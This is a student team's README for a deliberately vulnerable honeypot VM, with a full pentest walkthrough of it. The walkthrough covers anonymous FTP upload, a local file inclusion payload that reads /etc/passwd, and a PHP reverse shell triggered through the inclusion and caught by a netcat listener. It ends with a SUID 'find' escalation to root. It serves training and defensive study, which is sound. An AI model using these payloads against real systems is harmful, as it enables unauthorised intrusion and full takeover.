# **NRT Blue Team Project - Honeypot**

<hr>

## **Honeypot Overview**
Honeypot is a small project from NRT Blue Team. 

In the project, we are assigned to construct an intentional vulnerability to lure attackers for the goal of tracking them down during the hunt. 

Within the scope of this document, we will set up the environment and pentest it.

+ Team members engage in the project:
	+ Cuong Nguyen: build the vulnerability & the blueprint for the attack.
	+ Jaskaran Mann: reproduce & report the attack results.
	+ Tung Nguyen: reproduce & report the attack results.

<br>

## **Installation**
1. Clone the repository.

```bash
git clone https://github.com/jayngng/NRTBlueTeam_VulnHP.git
```

2. Executing the following command with `sudo` privilege.

```bash
cd NRTBlueTeam_VulnHP
chmod +x ./setup.sh
sudo ./setup.sh
``` 

***Troubleshooting****: if there is any error in setting up the environment, please ensure that:
+ The Honeypot connects to the Internet.
+ Try executing:

```bash
sudo dpkg --configure -a
sudo ./setup.sh
```

After the installation is finished, please navigate to the HTTP service of the Honeypot, we should see the following.

![](image/installation.png)

Please consider deleting the folder `NRTBlueTeam_VulnHP` after the Honeypot is fully installed. 

<br>

## **Exploitation**

In this section, we will exploit the target.

Overview of vulnerabilities on the box:
+ Initial Access: Local File Inclusion (LFI).
+ Privilege Escalation: Misconfigured SUID binary.

| **Attack IP** | 192.168.12.1  |

| **Target IP** | 192.168.12.10 |

***Note***: Please notice that the IP address might be varied in different environment.

### **Enumeration**
We'll begin with a `nmap` scan with the tag `-sS` for half-way handshake scan (or SYN scan).

```bash
$ sudo nmap -sS 192.168.12.10
```

```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-14 13:36 AEST
Nmap scan report for 192.168.12.10
Host is up (0.00041s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:06:9F:AA (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds
```

There are three opened services, let's us start with `ftp`.

#### **FTP Enumeration**
To access the `ftp` file share, we utilize the `ftp` command with the credentials of `anonymous:anonymous`.

```bash
$ ftp 192.168.12.10
```

```bash
Connected to 192.168.12.10.
220 (vsFTPd 3.0.3)
Name (192.168.12.10:jaenguyen): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Sep 14 03:35 .
drwxr-xr-x    3 ftp      ftp          4096 Sep 14 03:35 ..
drwxrwxrwx    2 ftp      ftp          4096 Sep 14 03:35 pub
226 Directory send OK.
```

Listing the share with `ls -al`, we discover a `pub` directory.

```bash
ftp> cd pub
250 Directory successfully changed.
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 ftp      ftp          4096 Sep 14 03:35 .
drwxr-xr-x    3 ftp      ftp          4096 Sep 14 03:35 ..
-rw-r--r--    1 ftp      ftp            22 Sep 14 03:35 pubf.txt
226 Directory send OK.
```

Navigating to the directory, there is an accessible `pubf.txt` file.

From the `ftp` interactive shell, we run `get <file>` to download a file and `put <file>` to upload a file.

**[1]. Download the `pubf.txt`.**

```bash
ftp> get pubf.txt
local: pubf.txt remote: pubf.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for pubf.txt (22 bytes).
226 Transfer complete.
22 bytes received in 0.00 secs (190.1272 kB/s)
```

+ Inspect the content of `pubf.txt` with `cat`.

```bash
$ cat pubf.txt 
/var/ftp/pub/pubf.txt
```

→ The `/var/ftp/pub/` directory seems to be an absolute location to the file `pubf.txt` ...  

**[2]. Upload a random file (any file of your choice).**

```bash
ftp> put test
local: test remote: test
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            22 Sep 14 03:50 pubf.txt
-rw-------    1 ftp      ftp             0 Sep 14 03:52 test
226 Directory send OK.
```

The result indicates the `test` file has been successfully uploaded.

#### **HTTP Service**
Now, let's move on to enumerating the hidden directory with `gobuster`.

To install the `gobuster`, we execute

```bash
$ sudo apt-get install -y gobuster
```

After `gobuster` is installed, we can then call it with tags:
+ `dir -u`: for target URL.
+ `-w <directory_list>`: for wordlists. 

```bash
$ gobuster dir -u http://192.168.12.10 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt
```

```bash
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.12.10
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-1.0.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/09/14 13:58:46 Starting gobuster in directory enumeration mode
===============================================================
/development          (Status: 301) [Size: 320] [--> http://192.168.12.10/development/]
/assets               (Status: 301) [Size: 315] [--> http://192.168.12.10/assets/]     
/forms                (Status: 301) [Size: 314] [--> http://192.168.12.10/forms/]
```

→ Looking at the outputs, we then drop our attention toward the `/development` directory.

Navigate to the `/development/` directory →  Click on `ABOUT US`, we are redirected to a new `about-us` page.

Notice that the entry URL of the page is: `...?view=about-us.html`, which might be vulnerable to **Local File Inclusion (LFI)**. To test our theory, we utilize `curl`.

```bash
$ curl -s http://192.168.12.10/development/index.php\?view=../../../../../../../etc/passwd
```

```bash
[...]
<p>root:x:0:0:root:/root:/bin/bash
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
ftp:x:112:118:ftp daemon,,,:/srv/ftp:/bin/false
[...]
```

The result successfully returns the content of the `passwd` file in the target system. At this point, we comprehend that the target is vulnerable to LFI.

#### LFI → Remote Code Execution (RCE)
Recalling the `pubf.txt` file we discovered previously, let's us pull a reverse shell by following the below steps.

**[1]. Upload a [php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) onto the `ftp` file share.**

***Note:*** please change the `$ip` and `$port` variables of the `php-reverse-shell.php` to your Attacker IP and a random port of your choice (I chose port 80 in this case).

```bash
ftp> put php-reverse-shell.php
local: php-reverse-shell.php remote: php-reverse-shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
3460 bytes sent in 0.00 secs (11.9123 MB/s)
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 ftp      ftp          4096 Sep 14 04:12 .
drwxr-xr-x    3 ftp      ftp          4096 Sep 14 03:50 ..
-rw-------    1 ftp      ftp          3460 Sep 14 04:12 php-reverse-shell.php
-rw-r--r--    1 ftp      ftp            22 Sep 14 03:50 pubf.txt
-rw-------    1 ftp      ftp             0 Sep 14 03:52 test
226 Directory send OK.
```

**[2]. Set up a `nc` listener and trigger the shell.**

+ On the first terminal, we set up `nc` listener.

```bash
$ sudo nc -nlvp <LocalPort>
```

+ On the second terminal, we call the shell as below.

```bash
$ curl -s 192.168.12.10/development/index.php?view=../../../../../../var/ftp/pub/php-reverse-shell.php
```

After the command is executed, our `nc` should catch the shell as `www-data`.

```bash
$ sudo nc -nlvp 80
Listening on 0.0.0.0 80
Connection received on 192.168.12.10 52806
Linux ubuntu-xenial 4.4.0-210-generic #242-Ubuntu SMP Fri Apr 16 09:57:56 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 04:15:14 up 25 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Privilege Escalation

#### SUID Abuse
Local enumeration divulges a misconfigured `SUID` binary that we can abuse to escalate your privilege.

```bash
$ find / -perm -u=s -ls 2>/dev/null
[...]
    24208    220 -rwsr-sr-x   1 root     root         221768 Feb  7  2016 /usr/bin/find
[...]
```

We continue executing ...

```bash
www-data@ubuntu-xenial:/$ find . -exec /bin/bash -p \; -quit
find . -exec /bin/bash -p \; -quit
bash-4.3# whoami
root
```

and successfully obtain the `root` shell.
